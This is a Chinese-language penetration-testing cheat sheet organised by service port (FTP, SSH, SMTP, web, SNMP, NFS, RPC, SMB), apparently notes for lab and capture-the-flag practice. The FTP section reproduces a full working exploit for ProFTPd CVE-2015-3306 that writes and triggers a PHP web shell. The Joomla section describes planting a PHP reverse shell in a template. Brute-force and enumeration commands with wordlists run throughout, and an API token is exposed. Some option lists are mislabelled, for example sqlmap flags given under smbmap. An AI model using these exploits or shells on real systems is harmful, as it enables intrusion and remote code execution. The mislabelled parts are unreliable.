# ftp服务：21

默认端口：21

- anonymous 是否可以登录
- 如果可以登录是否可以使用 get 或 send 操作文件
- 使用浏览器是否可以访问，`ftp://<ip-address>`

## 常见漏洞

### 匿名访问漏洞

```
ftp 192.168.56.107
ftp-anon: Anonymous FTP login allowed (FTP code 230)
使用用户名：anonymous  密码为空  回车登录
提示：230 login successful 即为成功登录。
```

## FTP操作
### 切换至二进制模式

（减少可执行文件下载后损坏的可能性）
```
binary
```
提示：200 Switching tu binary mode;即为成功

### 批量下载

```
#关掉交互式提示
prompt

binary

#下载当前目录所有文件
mget *.txt
```

### 下载整个目录及其子目录中的所有文件

```
mget -R *
```

### ProFTPd拷贝漏洞

```
telnet 192.168.56.254 21      连接交互式服务

site cpfr /home/patrick/version_control           想要复制的文件在远程机的路径
site cpto /home/ftp/version_control    复制后，文件存储在远程机的路径

QUIT     退出
```

payload

./exploit.py --host 127.0.0.1 --port 21 --path "/var/www/html/"

```
#!/usr/bin/env python
# CVE-2015-3306 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-3306

import re
import socket
import requests
import argparse

class Exploit:
    def __init__(self, host, port, path):
        self.__sock = None
        self.__host = host
        self.__port = port
        self.__path = path

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))
        self.__sock.recv(1024)

    def __exploit(self):
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            print("[+] Running whoami: " + self.__trigger())
            print("[+] Done")
        else:
            print("[!] Failed")

    def __trigger(self):
        data = requests.get("http://" + self.__host + "/backdoor.php?cmd=whoami")
        match = re.search('cpto /tmp/.([^"]+)', data.text)
        return match.group(0)[11::].replace("\n", "")

    def run(self):
        self.__connect()
        self.__exploit()

def main(args):
    print("[+] CVE-2015-3306 exploit by t0kx")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Exploit(args.host, int(args.port), args.path)
    exploit.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--path', required=True)
    args = parser.parse_args()

    main(args)
```

### 上传文件

#### 一、使用传统 `ftp` 命令（适用于所有 Linux/macOS/Windows）
##### 2. 上传单个文件
```bash
put <本地文件路径> <远程目标路径>
# 示例：上传本地的 test.txt 到服务器根目录
put test.txt test.txt

# 若目标路径不存在，需先创建目录
mkdir myfolder
cd myfolder
put test.txt
```

##### 3. 上传多个文件
```bash
mput <本地文件1> <本地文件2> ...
# 示例：上传多个文件
mput file1.txt file2.txt file3.txt

# 批量上传当前目录所有 .txt 文件
mput *.txt
```
**注意**：执行 `mput` 前建议使用 `prompt off` 关闭交互式确认（否则每个文件都需手动确认）。

##### 4. 上传目录（递归上传）
`ftp` 原生不支持递归上传目录，需借助脚本或其他工具。但可使用 `lcd` 和 `cd` 切换本地/远程目录后逐个上传：
```bash
# 本地切换到要上传的目录
lcd /path/to/local/dir

# 远程创建对应目录
mkdir remote_dir
cd remote_dir

# 上传当前本地目录所有文件
mput *
```
修改文件权限
```
ftp> quote SITE CHMOD 644 filename.txt
```

#### 二、使用 `lftp`（推荐，功能更强大）

```bash
lftp <服务器地址>
# 示例：lftp example.com

# 登录后，上传单个文件
put <本地文件> -o <远程路径>
# 示例：上传 test.txt 到远程目录 /pub/
put test.txt -o /pub/test.txt

# 递归上传整个目录
mirror -R <本地目录> <远程目录>
# 示例：上传本地 myproject 目录到远程 /projects/ 下
mirror -R myproject /projects/

# 修改文件权限
lftp> chmod 644 filename.txt
```

##### 3. 常用 `lftp` 命令
| 命令                  | 作用                 |
| ------------------- | ------------------ |
| `ls`                | 查看远程目录             |
| `lcd <目录>`          | 切换本地目录             |
| `cd <目录>`           | 切换远程目录             |
| `mirror -R src dst` | 递归上传 `src` 到 `dst` |
| `mirror dst`        | 下载远程 `dst` 目录到本地   |
| `exit` 或 `bye`      | 退出 `lftp`          |


# ssh服务：22

默认端口:22

#### 参数补写

ssh登录报错1

```
ssh dstevens@192.168.216.129        
Unable to negotiate with 192.168.216.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

解决方法：

```
使用 -o 选项指定 KexAlgorithms 参数来选择支持的密钥交换方法

ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 dstevens@192.168.216.129

这将临时指定要使用的密钥交换方法。
```

ssh登录报错2

```
ssh -oKerberosAuthentication=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.216.129

command-line line 0: Unsupported option "kerberosauthentication"
Unable to negotiate with 192.168.216.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

```

解决方法：

```
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1  dstevens@192.168.216.129

```

#### 私钥解密

我们利用ssh2john生成hash.txt文件

```
/usr/share/john/ssh2john.py id_rsa > hash.txt
```

然后使用john进行密码的破解

```
john --wordlist=/usr/share/worlists/rockyou.txt hash.txt
```


# smtp服务：25

默认端口：25

#### 枚举用户名：

1、telnet测试用户名

```
telnet IP地址 端口
vrfy 用户名@mail地址
```

2、metasploit测试用户名

在metasploit中有smtp-enum可以对smtp上用户名进行枚举。
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```
use auxiliary/scanner/smtp/smtp_enum
```

3、smtp-user-enum测试用户名

```
smtp-user-enum -M VRFY -U user.txt -t IP地址
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.56.101
```

4、ismtp测试用户名

```
ismtp -h IP地址:25 -e email.txt
email.txt为邮箱地址文件，每一行都是一个邮箱地址
```


#### 枚举密码：

枚举用户，使用 VRFY 和 EXPN 命令

1、smtp版本信息获取

```
metasploit下smtp_version
```

2、medusa工具介绍

```
-u/U    用户名/用户名文件
-p/P    密码/密码文件
-h/H    IP地址/IP地址文件
medusa -d    查看有什么模块
```

3、smtp验证方式

```
PLAIN、LOGIN、GSSAPI、DIGEST-MD5、MD5、CRAM-MD5、OAUTH10A、OAUTHBEARER
```

4、medusa破解smtp

```
medusa -h 目标IP地址 -u 用户名 -P 字典文件 -M 协议模块
```



# finger服务：79

Finger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。


# web服务：80、8080

默认端口：80

### fuzz探测

##### wfuzz
```
wfuzz -u 192.168.2.5/test.php?FUZZ=/etc/passwd  -w user.txt --hh 80
```
##### ffuf
```
ffuf -c -w user.txt -u 'http://192.168.2.5/test.php?FUZZ=/etc/passwd' -fs 80
```

#### wordpress

##### wpscan

**添加token**(加了token才有高级功能，免费)

```shell
sudo wpscan --api-token vkd34m0eKZcO3Cpa4NekrsSyQpHicgxGm7JEY4GL8CE --url http://192.168.15.176/wordpress
```

**更新漏洞库**  

```shell
wpscan --update
```

**扫描站点**  

```shell
wpscan --url http://192.168.15.176/wordpress
```

漏洞盲扫

  - 命令集合  

```sh
wpscan --url "http://192.168.15.176/wordpress" --enumerate vp,vt,tt,u
```

暴力破解

  - 枚举wordpress的用户  

```
wpscan --url "http://192.168.56.110/wordpress" --enumerate u
```

  - 使用wpscan进行暴力破解  

```
wpscan --url "http://192.168.15.176/wordpress" --usernames [用户名或用户名字典]  --passwords [字典文件] --max-threads [开启的最大线程数]
OR
wpscan --url "http://192.168.15.176/wordpress" -U [用户名或用户名字典] -P [密码字典] -t [开启的最大线程数]

#扫描用户名并爆破
wpscan --url http://192.168.110.131:8000/ -e u --passwords /root/1.txt
```

插件扫描

  - 扫描安装的插件  

```
wpscan --url http://192.168.15.176/wordpress --enumerate p 
```

  - 扫描安装的插件的漏洞

```
wpscan --url=http://wordpress.aragog.hogwarts/blog -e p --plugins-detection aggressive
```

主题扫描

  - 对主题进行扫描  

```
wpscan --url http://192.168.15.176/wordpress --enumerate t
```

  - 扫描主题中存在的漏洞  

```
wpscan --url http://192.168.15.176/wordpress --enumerate vt
```

TimThumbs文件扫描  
TimThumbs是wordpress的常用文件，主要和缩略图的使用有关

```sh
wpscan --url http://192.168.15.176/wordpress --enumerate tt
```

##### WPForce爆破

项目地址
```
https://github.com/n00py/WPForce
proxychains4 git clone https://github.com/n00py/WPForce.git
```
密码字典合集：
```
https://github.com/danielmiessler/SecLists
```
开始爆破
```
python wpforce.py -i user.txt -w password.txt -u http://192.168.253.182:8000/

{'bob': 'Welcome1'}
```
##### wordpress 敏感文件

```
wordpress搭建的网站数据库账号密码会记录在/etc/wordpress/config-default.php
```

在WordPress中，敏感文件包括`wp-config.php`、`wp-login.php`、`wp-includes/`和`wp-admin/`目录下的文件。这些文件如果泄露，可能会导致安全问题，例如，通过`wp-config.php`文件可以直接访问数据库，通过`wp-login.php`可以尝试进行登录攻击


1. 使用 `.env` 文件：  
    在 WordPress 项目的根目录创建一个 `.env` 文件，然后在其中保存你的敏感信息，例如数据库凭证和密码。WordPress 有一个插件叫做 "wp-env"，它可以帮助你加载 `.env` 文件中的变量。
    
2. 使用 `wp-config.php` 文件：  
    在 WordPress 的根目录中，你可以使用 `wp-config.php` 文件来定义常量或变量，但要确保不要将其提交到版本控制系统中。
    
3. 使用环境变量：  
    在服务器上设置环境变量，然后在 WordPress 配置文件中引用这些变量。
    
4. 使用加密方法：  
    对于密码等敏感信息，使用加密方法来保存和验证，例如使用 PHP 的 `password_hash()` 和 `password_verify()` 函数。
    
5. 使用安全插件：  
    使用 WordPress 插件来增强安全性，这些插件可以帮助你保护密码、防止暴力破解等。
    
6. 定期更新：  
    定期检查你的 WordPress 网站和所有插件、主题是否有最新的安全更新。
    

以下是一个简单的例子，展示如何在 `wp-config.php` 中定义数据库凭证，而不是直接暴露它们：

```php
php// 
wp-config.phpdefine('DB_NAME', 'your_database_name');
define('DB_USER', 'your_database_username');
define('DB_PASSWORD', 'your_database_password');
define('DB_HOST', 'localhost');
```

请注意，这些方法都需要你根据自己的安全策略和环境来实施。始终确保遵守最佳安全实践，并及时更新你的 WordPress 安装和插件。
#### joomla

joomscan

[渗透神器OWASPJoomScan安装使用详解-CSDN博客](https://blog.csdn.net/qq_51577576/article/details/130142187)
```shell
sudo joomscan --url http://192.168.56.108/joomla/
```

大马-修改Templates中的beez3中的文件
```shell
kali webshell文件路径：/usr/share/webshells/php/php-reverse-shell.php
修改为kali自带的php反弹shell代码，记得修改49行和50行的反弹主机和端口

kali：nc -vlp 9999

浏览器访问：http://192.168.2.199/joomla/templates/beez3/index.php
```
#### wolf cms

默认用户名：admin
默认密码：admin
登陆页面：x.x.x.x/?admin
漏洞：文件上传漏洞，可以上传webshell的php文件



# snmp服务

## 利用点

- 信息泄露风险：
    - 通过 SNMPWalk 获取的信息可能包含敏感信息，如系统名称、接口 IP 地址、用户账户等，要评估这些信息是否会导致安全漏洞。例如，泄露的接口 IP 地址可能被攻击者用于其他攻击，如针对这些 IP 地址的端口扫描或攻击。

## 1. 端口扫描
```
nmap -sU -p 161 <target_ip>
```
## 2. nmap脚本扫描
```
nmap --script=snmp-* -sU -p 161 <target_ip>
```
示例：
```
└─# nmap --script=snmp-* -sU -p 161 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 05:15 EST
Nmap scan report for 10.10.11.48
Host is up (0.17s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 1h07m03s
| snmp-brute: 
|_  public - Valid credentials
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 1h07m6.27s (402627 timeticks)

Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds

```
解析：
```
SNMP相关脚本扫描结果：
snmp-info脚本结果：
    |   enterprise: net-snmp：表明目标SNMP服务使用的是net-snmp软件。net-snmp是一个开源的SNMP实现，广泛用于Linux和Unix系统。
    |   engineIDFormat: unknown：表示SNMP引擎的ID格式未知。SNMP引擎ID用于唯一标识SNMP实体，这里无法识别其格式可能意味着该引擎ID的格式不常见或NMAP无法解析。
    |   engineIDData: c7ad5c4856d1cf6600000000：显示了SNMP引擎的ID数据，这个数据可以用于识别SNMP引擎，但从这串数据本身可能无法直接看出更多信息，除非与已知的引擎ID模式进行比较。
    |   snmpEngineBoots: 29：表示SNMP引擎启动的次数，这可以用于了解SNMP服务的稳定性或可能的重启频率。
    |_  snmpEngineTime: 1h07m03s：表示SNMP引擎已经运行了1小时7分3秒，这可以提供一些关于服务运行时间的信息，有助于评估服务的稳定性和可能的维护时间。
snmp-brute脚本结果：
    | snmp-brute: ：使用snmp-brute脚本的结果。
    |_  public - Valid credentials：表示该脚本成功找到了一个有效的共享名称（Community String）为public。在SNMPv1和SNMPv2c中，共享名称类似于密码，用于身份验证和访问控制。这是一个非常重要的信息，因为攻击者可以使用这个共享名称来进一步与SNMP服务交互，可能会导致信息泄露或未经授权的配置修改。
snmp-sysdescr脚本结果：
    | snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64：该脚本成功获取了目标系统的系统描述信息。可以看到，该系统是一个运行在Ubuntu上的Linux系统，内核版本为5.15.0-126-generic，这为后续的渗透测试提供了更多关于目标系统的信息，包括操作系统类型和版本，这对于选择合适的攻击工具和方法很有帮助。
    |_  System uptime: 1h07m6.27s (402627 timeticks)：显示了系统的运行时间，通过timeticks（时间刻度）的方式表示，同时也以人类可读的方式给出了时间长度。


基于这些信息，你可以进行以下操作：
- 你现在已经知道了SNMP服务使用的共享名称是public，可以使用snmpwalk等工具进一步获取更多的系统信息，如设备的接口信息、路由信息等。例如：

snmpwalk -v 2c -c public 10.10.11.48

```
## 3. 共享名称猜测（针对 SNMPv1 和 SNMPv2c）
默认共享名称如：public, private, cisco, manager
onesixtyone 是一款专门用于 SNMP 共享名称暴力破解的工具。
```
onesixtyone -c community_file.txt <target_ip>
```
## 4. 使用 SNMPWalk 进行信息提取（在获取共享名称后）
SNMPWalk 工具：如果通过共享名称猜测成功获取了 SNMP 服务的共享名称，可以使用 SNMPWalk 工具来提取目标设备的信息。
```
snmpwalk -v <snmp_version> -c <community_string> <target_ip>
```
示例
```
┌──(root㉿kali)-[~]
└─# snmpwalk -v 2c -c public 10.10.11.48  
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (464437) 1:17:24.37
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (465835) 1:17:38.35
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 1A 0A 0B 1D 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 219
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```
解析

以下是对上述`snmpwalk`输出的详细解释：

1. **基本信息**：
   - `snmpwalk -v 2c -c public 10.10.11.48`：
     - `-v 2c`：表示使用SNMP版本2c进行通信。
     - `-c public`：使用共享名称`public`进行身份验证，这是之前通过NMAP的`snmp-brute`脚本找到的有效共享名称。

2. **SNMP对象标识符（OID）及其对应的值**：
   - **系统描述（iso.3.6.1.2.1.1.1.0）**：
     - `iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"`：
       - 提供了目标系统的描述，确认是一个运行在Ubuntu上的Linux系统，内核版本为5.15.0-126-generic，运行时间是2024年11月6日10:38:22 UTC，架构为x86_64。
   - **系统对象标识符（iso.3.6.1.2.1.1.2.0）**：
     - `iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10`：
       - 表示系统的对象标识符，该OID通常指向一个更详细的系统信息树。对于SNMP来说，它可能是一个设备的特定类型或型号的标识符，但从这个OID本身，你可能需要参考SNMP的MIB文档来获取更具体的信息。
   - **系统运行时间（iso.3.6.1.2.1.1.3.0）**：
     - `iso.3.6.1.2.1.1.3.0 = Timeticks: (464437) 1:17:24.37`：
       - 显示系统已经运行了464437个时间刻度，以人类可读的时间表示为1小时17分24.37秒。这可以让你了解系统的运行时间，对于判断系统的稳定性或近期是否有维护操作可能有用。
   - **系统联系人（iso.3.6.1.2.1.1.4.0）**：
     - `iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"`：
       - 显示系统联系人信息，这里是`steve@underpass.htb`，可能是系统管理员的联系信息，这对于社会工程攻击可能有用，也可能帮助你猜测用户名或电子邮件地址。
   - **系统名称（iso.3.6.1.2.1.1.5.0）**：
     - `iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"`：
       - 给出了系统的名称，并且提到该系统是`basin`中唯一的`daloradius`服务器，这可能暗示着该系统运行着`daloradius`服务，这是一个开源的Radius服务器软件，可作为进一步攻击的线索，因为你可以查找`daloradius`的已知漏洞。
   - **系统位置（iso.3.6.1.2.1.1.6.0）**：
     - `iso.3.6.1.2.1.1.5.0 = STRING: "Nevada, U.S.A. but not Vegas"`：
       - 显示系统的物理位置，这里是美国内华达州（但不是拉斯维加斯），对于某些需要物理访问的攻击（虽然不太常见）可能有用，也可以作为信息收集的一部分。
   - **系统服务（后续OID）**：
     - 从`iso.3.6.1.2.1.1.9.1.2.1`到`iso.3.6.1.2.1.1.9.1.2.10`及其对应的描述：
       - 这些OID及其对应的值提供了关于SNMP管理架构的信息，包括不同的MIB模块，如消息处理、用户安全模型、SNMPv2实体、访问控制模型、TCP、UDP、IP、ICMP管理等。这些信息对于了解系统的网络和管理架构很有用，并且可以帮助你找到可能的攻击面，例如，如果有一个管理TCP实现的MIB模块，你可以检查该模块是否有相关的漏洞。
   - **启动信息（iso.3.6.1.2.1.25.1.1.0）**：
     - `iso.3.6.1.2.1.25.1.1.0 = Timeticks: (465835) 1:17:38.35`：
       - 可能表示系统启动的时间，以时间刻度和人类可读时间表示，与之前的系统运行时间信息相呼应。
   - **其他系统信息（后续OID）**：
     - `iso.3.6.1.2.1.25.1.2.0`到`iso.3.6.1.2.1.25.1.7.0`：
       - 这些信息包括十六进制字符串、整数、字符串和Gauge32类型的数据，可能涉及系统的内部参数或状态，例如，`iso.3.6.1.2.1.25.1.4.0`给出了启动镜像和根设备信息，这可以帮助你了解系统的启动配置和存储设备信息，可能对系统的进一步攻击（如修改启动配置）有帮助。


根据这些信息，你可以采取以下步骤：
- 对`daloradius`服务进行深入研究，查找已知的漏洞，并尝试利用这些漏洞进行渗透。
- 利用系统联系人信息进行社会工程攻击，或者尝试使用用户名`steve`和相关的域名`underpass.htb`进行密码猜测或其他攻击。
- 分析系统启动信息，看是否可以利用启动过程中的漏洞，如修改`BOOT_IMAGE`或其他启动参数（虽然这通常需要更高的权限，但在某些配置错误的情况下可能可行）。


以下是一些后续可能使用的工具和命令：
- 如果你想查找`daloradius`服务的漏洞，可以使用`searchsploit`：
```
searchsploit daloradius
```
- 对于可能的密码猜测，你可以使用工具如`hydra`或`medusa`，结合之前得到的用户名信息：
```
hydra -l steve -P /path/to/password_list.txt 10.10.11.48 radius
```




## 5. SNMP 攻击和利用（如果可能）
**修改配置（仅在授权的测试范围内）**：

- 对于 SNMPv2c，如果你发现具有可写的共享名称（具有更高的权限），可以尝试修改设备的配置，但要确保你有合法的授权。
```
snmpset -v 2c -c <community_string> <target_ip> <OID> <type> <value>
```
## 6. SNMPv3 的渗透测试（更复杂）

- **使用 snmp-check 工具**：
    - 对于 SNMPv3，由于其具有更强的安全性，可以使用 snmp-check 工具进行更详细的测试。
```
snmp-check -t <target_ip> -v 3 -u <username> -l <auth_protocol> -a <auth_password> -x <priv_protocol> -X <priv_password>
```

使用工具：

```
Onesixtyone –c <community list file> -I <ip-address>

Snmpwalk -c <community string> -v<version> <ip address>

```

默认 MIB：

```
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

比如枚举运行的进程

```
nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2
```

# NFS服务

网络文件系统 (NFS) 服务提供一个文件共享解决方案，可用于通过 NFS 协议在运行 Windows Server 和 UNIX 操作系统的计算机之间传输文件。

## 扫描是否有NFS共享目录

```
showmount -e <ip address>
```

## 挂载NFS共享目录

```
sudo mount -t nfs <ip address>:<共享目录路径> <本地路径>
```

# rpc服务

默认端口：25

```
Rpcclient <ip address> -U "" -N
Rpcinfo -p <target ip>
```

关于 RPC 历史漏洞的合集：
```
http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/
```

以下是常用的远程测试命令

```
showmount -e <ip address>/<port>

mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””

rlogin <ip-address>

smbclient -L <ip-address> -U “” -N

nbtscan -r <ip address>

net use <ip-address>$Share “” /u:””

net view <ip-address>
```

### rpcbind

```
rpcbind是NFS（网络文件共享协议）中进行消息通知的服务，一般是111端口，并且NFS配置开启rpcbind_enable=“YES”
```

### 探测目标rpcbind

```
nmap -sV IP地址 -p 端口
eg：nmap -sV 192.168.207.133 -p 111
searchsplioit rpcbind //查看是否有可利用的脚本
```

# 139/445 SMB服务

Smb 服务对应的端口有 139、445等等

## smb敏感文件【需要补充内容】

```
lsass 本地安全权限服务
```

#### 默认文件

```
ADMIN$  所有Windows系统上的默认共享，需要管理员访问权限
C$            所有Windows系统上的默认共享，需要管理员访问权限 
IPC$         所有Windows系统上的默认共享，需要管理员访问权限
NETLOGON和SYSVOL⼀般是域控制器（DC）的标准配置。
```

## 扫描

### 检查是否启动了SMB服务

```
nc -z 192.168.56.127 445
```

### smbmap枚举 

smbmap查看smb的共享目录、目录权限和其备注。 
```
smbmap -H 192.168.56.113
```
选项
```
-u 指定目标URL (可以是http协议也可以是https协议)
-d 连接数据库
--dbs 列出所有的数据库
--current-db 列出当前数据库
--tables 列出当前的表
--columns 列出当前的列
-D 选择使用哪个数据库
-T 选择使用哪个表
-C 选择使用哪个列
--dump 获取字段中的数据
--batch 自动选择yes
--smart 启发式快速判断，节约浪费时间
--forms 尝试使用post注入
-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
-o 开启所有默认性能优化
--tamper 调用脚本进行注入
-v 指定sqlmap的回显等级
--delay 设置多久访问一次
--os-shell 获取主机shell，一般不太好用，因为没权限
-m 批量操作
-c 指定配置文件，会按照该配置文件执行动作
-data data指定的数据会当做post数据提交
-timeout 设定超时时间
--level 设置注入探测等级
--risk 风险等级
--identify-waf 检测防火墙类型
--param-del="分割符" 设置参数的分割符
--skip-urlencode 不进行url编码
--keep-alive 设置持久连接，加快探测速度
--null-connection 检索没有body响应的内容，多用于盲注
--thread 最大为10 设置多线程
```

### smbclient枚举 

1、获取共享目录名称
```
smbclient -L //192.168.56.106
smbclient -L //192.168.56.106 -N
在Sharename列找非$结尾的行（$结尾的是默认显示的目录）
```
2、交互式登录smb
```
smbclient //<IP>/<Sharename> -U 用户名%密码
smbclient //<IP>/<Sharename> -U 用户名       【输入密码】

smbclient //192.168.216.157/qiu -U qiu      【输入密码】
smbclient \\\\192.168.216.157\\qiu -U qiu   【输入密码】
smbclient //192.168.216.157/qiu -U qiu%password

执行smbclient命令成功后，进入smbclient环境，出现提示符：smb:/>\
这里有许多命令和ftp命令相似，如cd、lcd、get、megt、put、mput等。
```
### nmblookup SMB枚举主机名

nmblookup用于在网络中查询NetBIOS名称，并将其映射到对应的IP地址。可以使用合适的选项来允许nmblookup查询一个IP广播域或是一个单独的机器，所有的查询都是通过UDP完成的。

对于唯一名称：
```
00: 工作站服务(Workstation Service)
03: 信使服务(Windows Messenger Service)
06: 远程访问服务(Remote Access Service)
20: 文件服务(File Service)
21: 远程访问服务客户端(Remote Access Service client)
1B: 网域主浏览器(Domain Master Browser )
1D: 主浏览器(Master Browser)
```
对于组名称：
```
00: 工作站服务(Workstation Service)
1C: 域名的域控制器(Domain Controllers for a domain)
1E: 浏览器服务选择(Browser Service Elections)
```

使用

```text
nmblookup -A 192.168.1.17
```

### nmap

```text
nmap --script smb-os-discovery 192.168.1.17
```

### enum4linux

enum4linux-ng是最新版本
```
enum4linux-ng 192.168.56.106
enum4linux -a -o 192.168.56.106
```
首先是用于枚举的选项，如下：
```
选项       功能
-U    获取用户列表
-M    获取机器列表
-S    获取共享列表
-P    获取密码策略信息
-G    获取组和成员列表
-d    详述，适用于-U和-S
-u    user 用户指定要使用的用户名（默认为空）
-p    指定要使用的密码（默认为空）
```

接着是一些官方附加的选项命令，如下：

```
选项    功能
-a    做所有简单枚举（-U -S -G -P -r -o -n -i），如果不指定选项，默认启用此选项
-h    显示此帮助消息并退出
-r    通过RID循环枚举用户
